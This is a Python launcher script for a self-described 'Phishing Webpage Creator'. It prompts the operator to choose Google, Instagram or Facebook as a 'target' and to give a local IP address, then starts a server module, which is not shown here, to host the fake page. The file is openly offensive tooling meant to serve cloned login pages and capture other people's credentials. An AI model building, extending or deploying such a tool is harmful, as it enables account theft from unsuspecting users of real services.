import os
import server
import re

version = 0.1
banner = """x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x
|                                 |
x    Phishing Webpage Creator     x
|             v{v}                |
x   https://github.com/skyexzs    x
|                                 |
x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x\n""".format(v = version)

sites = ["Google", "Instagram", "Facebook"]
page_folder = "pages"

def print_intro():
    global banner
    # Print banner and initial text
    print(banner)
    print("Choose a website to phish:")
    
    # List available sites to phish
    i = 1
    for s in sites:
        print("{i}) {s}".format(i = i, s = s))
        i += 1

def get_site_input():
    try:
        choice = input("\nPlease enter a number: ")
        choice = int(choice) - 1

        if (choice < 0 or choice > len(sites) - 1):
            raise IndexError

        print("You have chosen {s} as a target!".format(s = sites[choice]))

        return choice
        
    except (IndexError, ValueError):
        print("Error during site selection.")
    
    return None

def get_host():
    ip = input("\nEnter your local network's IP address (leave blank for localhost): ")

    if ip == "":
        ip = "localhost"
    elif (re.search(r'^\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b$', ip) == None):
        print("Oops! That does not resemble an IP address. Switching to localhost...")
        ip = "localhost"
    
    return ip

def main():
    # Route working directory to the python file
    main_path = os.path.dirname(os.path.realpath(__file__))
    os.chdir(main_path)

    print_intro()

    choice = get_site_input()

    if choice != None:
        site = sites[choice].lower()

        ip = get_host()

        if ip != None:
            return site, ip
    
    return None, None

if __name__ == "__main__":
    site, ip = main()

    if site != None and ip != None:
        server.start(site, ip)